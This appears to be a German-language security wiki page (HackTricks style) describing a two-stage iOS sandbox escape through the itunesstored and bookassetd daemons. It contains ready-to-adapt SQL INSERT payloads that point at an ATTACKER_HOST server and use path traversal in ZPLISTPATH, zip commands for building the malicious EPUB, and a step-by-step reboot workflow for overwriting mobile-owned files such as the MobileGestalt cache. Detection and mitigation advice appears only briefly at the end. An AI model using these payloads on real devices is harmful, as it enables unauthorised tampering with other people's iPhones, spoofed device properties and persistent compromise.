# itunesstored & bookassetd Sandbox Escape

{{#include ../../banners/hacktricks-training.md}}

## Übersicht

Aktuelle Forschung zeigt, dass zwei vorinstallierte iOS-Daemons, **`itunesstored`** (Downloads-Manager) und **`bookassetd`** (Books / iBooks Asset-Manager), blind den durch Benutzer beschreibbaren SQLite-Metadaten vertrauen. Durch das Ablegen manipulierter `downloads.28.sqlitedb`- und `BLDatabaseManager.sqlite`-Dateien sowie eines minimalen EPUB-Archivs kann ein Angreifer, der unter `/var/mobile/Media/` schreiben kann, diese Daemons dazu zwingen, **beliebige Datei-Schreibvorgänge über die meisten `mobile`-besessenen Pfade innerhalb von `/private/var/`** durchzuführen. Die Primitives überdauern Neustarts und ermöglichen das Manipulieren von SystemGroup-Caches wie `systemgroup.com.apple.mobilegestaltcache`, um Geräte-Eigenschaften zu fälschen oder Konfigurationen persistent zu machen.

Wichtige Eigenschaften:

- Funktioniert auf Geräten mindestens bis **iOS 26.2b1** (getestet auf iPhone 12 / iOS 26.0.1).
- Beschreibbare Ziele umfassen `SystemGroup`-Caches, `/private/var/mobile/Library/FairPlay`, `/private/var/mobile/Media` und andere Dateien, die `mobile` gehören. Schreibvorgänge an `root`-besessene Dateien schlagen fehl.
- Benötigt lediglich AFC-level access (USB file copy) oder irgendeinen foothold, der es erlaubt, die Ziel-SQLite-DBs zu ersetzen und Payloads hochzuladen.

## Bedrohungsmodell & Anforderungen

1. **Lokaler Dateisystemzugriff** auf `/var/mobile/Media/Downloads/` und `/var/mobile/Media/Books/` (via AFC-Clients wie 3uTools, i4.cn oder [`afcclient`](https://github.com/emonti/afcclient) über USB, oder jede vorherige Kompromittierung).
2. **HTTP server**, der Angreiferdateien hostet (`BLDatabaseManager.sqlite`, `iTunesMetadata.plist`, crafted EPUB) und über URLs wie `https://ATTACKER_HOST/fileprovider.php?type=...` erreichbar macht.
3. Möglichkeit, das Gerät mehrfach neu zu starten, damit jeder Daemon seine Datenbank neu lädt.
4. Kenntnis der **Books system-group UUID**, sodass der Stage 1-Schreibvorgang im richtigen Container landet (auffindbar via syslog).

## Stage 1 – Ausnutzen von `downloads.28.sqlitedb` über `itunesstored`

`itunesstored` verarbeitet `/var/mobile/Media/Downloads/downloads.28.sqlitedb`. Die `asset`-Tabelle speichert URL- und Ziel-Metadaten und wird als vertrauenswürdige Eingabe behandelt. Das Erstellen einer Zeile, die auf eine Angreifer-URL zeigt und `local_path` auf `.../Documents/BLDatabaseManager/BLDatabaseManager.sqlite` innerhalb der Books SystemGroup setzt, bewirkt, dass `itunesstored` beim Booten die Books-Datenbank herunterlädt und mit Angreiferinhalt überschreibt.

### Books SystemGroup UUID ermitteln

1. Sammle ein syslog-Archiv mit [`pymobiledevice3`](https://github.com/doronz88/pymobiledevice3):
```bash
pymobiledevice3 syslog collect logs.logarchive
```
2. Öffne `logs.logarchive` in **Console.app** und suche nach `bookassetd [Database]: Store is at file:///private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite`.
3. Notiere `<UUID>` und setze es in der SQL-Payload ein.

### Bösartige `asset`-Zeile

<details>
<summary>Stage 1 INSERT-Vorlage</summary>
```sql
INSERT INTO "main"."asset" (
"pid","download_id","asset_order","asset_type","bytes_total",
"url","local_path","destination_url","path_extension","retry_count",
"http_method","initial_odr_size","is_discretionary","is_downloaded",
"is_drm_free","is_external","is_hls","is_local_cache_server",
"is_zip_streamable","processing_types","video_dimensions",
"timeout_interval","store_flavor","download_token","blocked_reason",
"avfoundation_blocked","service_type","protection_type",
"store_download_key","etag","bytes_to_hash","hash_type","server_guid",
"file_protection","variant_id","hash_array","http_headers",
"request_parameters","body_data","body_data_file_path","sinfs_data",
"dpinfo_data","uncompressed_size","url_session_task_id"
) VALUES (
1234567890,6936249076851270150,0,'media',NULL,
'https://ATTACKER_HOST/fileprovider.php?type=sqlite',
'/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite',
NULL,'epub',6,'GET',NULL,0,0,0,1,0,0,0,0,
NULL,60,NULL,466440000,0,0,0,0,'',NULL,NULL,0,
NULL,NULL,NULL,X'62706c6973743030a1015f1020...',NULL,NULL,NULL,NULL,NULL,NULL,0,1
);
```
</details>

**Wichtige Felder:**

- `url`: vom Angreifer kontrollierter Endpunkt, der die bösartige `BLDatabaseManager.sqlite` zurückliefert.
- `local_path`: die oben bestimmte `BLDatabaseManager.sqlite`-Datei der Books-Systemgruppe.
- Steuerflags: Standardwerte beibehalten (`asset_type='media'`, `path_extension='epub'`, boolesche Werte auf 0/1 wie in der Vorlage), damit der Daemon die Aufgabe akzeptiert.

### Bereitstellung

1. Veraltete Einträge in `/var/mobile/Media/Downloads/*` löschen, um Race-Conditions zu vermeiden.
2. `downloads.28.sqlitedb` via AFC durch die manipulierte DB ersetzen.
3. Neustart → `itunesstored` lädt die Stage-2-Datenbank herunter und legt `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist` ab.
4. Diese plist nach `/var/mobile/Media/Books/iTunesMetadata.plist` kopieren; Stage 2 erwartet sie an diesem Ort.

## Stage 2 – Missbrauch von `BLDatabaseManager.sqlite` über `bookassetd`

`bookassetd` besitzt erweiterte Dateisystem-Berechtigungen und vertraut der Tabelle `ZBLDOWNLOADINFO`. Durch Einfügen einer gefälschten Kaufzeile, die auf Angreifer-URLs verweist und einen Traversal in `ZPLISTPATH` enthält, lädt der Daemon Ihr EPUB nach `/var/mobile/Media/Books/asset.epub` herunter und entpackt später Metadaten in **jeden im Besitz von `mobile` befindlichen Pfad, der über `../../..`-Escape-Sequenzen erreichbar ist**.

### Bösartige `ZBLDOWNLOADINFO`-Zeile

<details>
<summary>Stage-2 INSERT-Vorlage</summary>
```sql
INSERT INTO "ZBLDOWNLOADINFO" (
"Z_PK","Z_ENT","Z_OPT","ZACCOUNTIDENTIFIER","ZCLEANUPPENDING",
"ZFAMILYACCOUNTIDENTIFIER","ZISAUTOMATICDOWNLOAD","ZISLOCALCACHESERVER",
"ZISPURCHASE","ZISRESTORE","ZISSAMPLE","ZISZIPSTREAMABLE",
"ZNUMBEROFBYTESTOHASH","ZPERSISTENTIDENTIFIER","ZPUBLICATIONVERSION",
"ZSERVERNUMBEROFBYTESTOHASH","ZSIZE","ZSTATE","ZSTOREIDENTIFIER",
"ZSTOREPLAYLISTIDENTIFIER","ZLASTSTATECHANGETIME","ZPURCHASEDATE",
"ZSTARTTIME","ZARTISTNAME","ZARTWORKPATH","ZASSETPATH",
"ZBUYPARAMETERS","ZCANCELDOWNLOADURL","ZCLIENTIDENTIFIER",
"ZCOLLECTIONARTISTNAME","ZCOLLECTIONTITLE","ZDOWNLOADID",
"ZDOWNLOADKEY","ZENCRYPTIONKEY","ZEPUBRIGHTSPATH","ZFILEEXTENSION",
"ZGENRE","ZHASHTYPE","ZKIND","ZMD5HASHSTRINGS","ZORIGINALURL",
"ZPERMLINK","ZPLISTPATH","ZSALT","ZSUBTITLE","ZTHUMBNAILIMAGEURL",
"ZTITLE","ZTRANSACTIONIDENTIFIER","ZURL","ZRACGUID","ZDPINFO",
"ZSINFDATA","ZFILEATTRIBUTES"
) VALUES (
1,2,3,0,0,0,0,'',NULL,NULL,NULL,NULL,
0,0,0,NULL,4648,2,'765107108',NULL,
767991550.119197,NULL,767991353.245275,NULL,NULL,
'/private/var/mobile/Media/Books/asset.epub',
'productType=PUB&salableAdamId=765107106&...',
'https://p19-buy.itunes.apple.com/...',
'4GG2695MJK.com.apple.iBooks','Sebastian Saenz','Cartas de Amor a la Luna',
'../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library',
NULL,NULL,NULL,NULL,'Contemporary Romance',NULL,'ebook',NULL,NULL,NULL,
'/private/var/mobile/Media/Books/iTunesMetadata.plist',NULL,
'Cartas de Amor a la Luna','https://ATTACKER_HOST/fileprovider.php?type=gestalt',
'Cartas de Amor a la Luna','J19N_PUB_190099164604738',
'https://ATTACKER_HOST/fileprovider.php?type=gestalt2',NULL,NULL,NULL,NULL
);
```
</details>

Wichtige Felder:

- `ZASSETPATH`: EPUB-Speicherort auf der Festplatte, der vom Angreifer kontrolliert wird.
- `ZURL`/`ZPERMLINK`: Angreifer-URLs, die das EPUB und die zusätzliche plist hosten.
- `ZPLISTPATH`: `../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library` – die **path traversal base**, die an Dateien angehängt wird, die aus dem EPUB extrahiert werden. Passen Sie die Traversal-Tiefe an, um das gewünschte SystemGroup-Ziel zu erreichen.
- Kauf-Metadaten (`ZSTOREIDENTIFIER`, names, timestamps) ahmen legitime Einträge nach, damit der Daemon die Zeile nicht verwirft.

Nachdem die bösartige DB nach `/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite` (dank Stage 1) kopiert wurde und das Gerät zweimal neu gestartet wurde, wird `bookassetd` (1) das EPUB herunterladen, (2) es verarbeiten und die abgeleitete plist unter dem traversierten Pfad schreiben.

## Erstellung der EPUB Payload

`bookassetd` respektiert das EPUB ZIP-Format: `mimetype` muss der erste unkomprimierte Eintrag sein. Um EPUB-Inhalte dem MobileGestalt-Cache zuzuordnen, bauen Sie eine Verzeichnisstruktur auf, die den gewünschten Pfad relativ zu `ZPLISTPATH` widerspiegelt.
```
Caches/
├── mimetype
└── com.apple.MobileGestalt.plist
```
Erstelle das Archiv:
```bash
zip -X0 hax.epub Caches/mimetype
zip -Xr9D hax.epub Caches/com.apple.MobileGestalt.plist
```
- `mimetype` enthält typischerweise die Literalzeichenfolge `application/epub+zip`.
- `Caches/com.apple.MobileGestalt.plist` enthält das attacker-controlled payload, das unter `.../Library/Caches/com.apple.MobileGestalt.plist` landen wird.

## Orchestrierungs-Workflow

1. **Dateien vorbereiten** auf dem attacker HTTP-Server und beide SQLite-DBs mit host/UUID-spezifischen Werten erstellen.
2. **Ersetze `downloads.28.sqlitedb`** auf dem Gerät und starte neu → Stage 1 lädt die bösartige `BLDatabaseManager.sqlite` herunter und erzeugt `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`.
3. **Kopiere `iTunesMetadata.plist`** nach `/var/mobile/Media/Books/iTunesMetadata.plist` (wiederholen, falls der daemon sie löscht).
4. **Erneut neu starten** → `bookassetd` lädt `asset.epub` nach `/var/mobile/Media/Books/` herunter unter Verwendung der Stage-2-Metadaten.
5. **Ein drittes Mal neu starten** → `bookassetd` verarbeitet das heruntergeladene Asset, folgt `ZPLISTPATH` und schreibt den EPUB-Inhalt in den Ziel-SystemGroup-Pfad (z. B. `com.apple.MobileGestalt.plist`).
6. **Überprüfen** indem man die überschriebene plist liest oder beobachtet, dass MobileGestalt-abgeleitete Eigenschaften (model identifier, activation flags, etc.) sich entsprechend ändern.

Dasselbe Muster erlaubt es, Dateien in anderen vom `mobile` besessenen Caches abzulegen, wie etwa FairPlay-State- oder Persistenzverzeichnissen, und ermöglicht so heimliches Manipulieren ohne einen kernel exploit zu benötigen.

## Tooling & Betriebsnotizen

- **`pymobiledevice3 syslog collect logs.logarchive`** – Log-Archive extrahieren, um die Books SystemGroup UUID zu ermitteln.
- **Console.app** – filtere nach `bookassetd [Database]: Store is at ...`, um den genauen Container-Pfad wiederherzustellen.
- **AFC-Clients (`afcclient`, 3uTools, i4.cn)** – push/pull von SQLite-DBs und plist-Dateien über USB ohne Jailbreak.
- **`zip`** – erzwinge EPUB-Reihenfolgebeschränkungen beim Verpacken von payloads.
- **Public PoC** – <https://github.com/hanakim3945/bl_sbx> enthält Baseline-SQLite/EPUB-Vorlagen, die du anpassen kannst.

## Erkennung & Abhilfemaßnahmen

- Behandle `downloads.28.sqlitedb` und `BLDatabaseManager.sqlite` als nicht vertrauenswürdige Eingabe: validiere, dass `local_path` / `ZPLISTPATH` innerhalb genehmigter Sandboxes bleiben und lehne vollqualifizierte Pfade oder Traversal-Token ab.
- Überwache AFC-Schreibvorgänge, die diese Datenbanken ersetzen, oder unerwartete Downloads, die kurz nach dem Boot von `itunesstored` / `bookassetd` initiiert werden.
- Härte das Unpacking von `bookassetd` ab, indem du `realpath()` für das Ausgabenziel verwendest und sicherstellst, dass es den Books-Container nicht verlassen kann, bevor Dateien geschrieben werden.
- Beschränke AFC/USB-Datei-Kopierkanäle oder fordere Benutzerinteraktion, bevor der Ersatz von Books/iTunes-Metadatendateien erlaubt wird.

## References

- [itunesstored & bookassetd sbx escape](https://hanakim3945.github.io/posts/download28_sbx_escape/)
- [bl_sbx PoC repository](https://github.com/hanakim3945/bl_sbx)

{{#include ../../banners/hacktricks-training.md}}
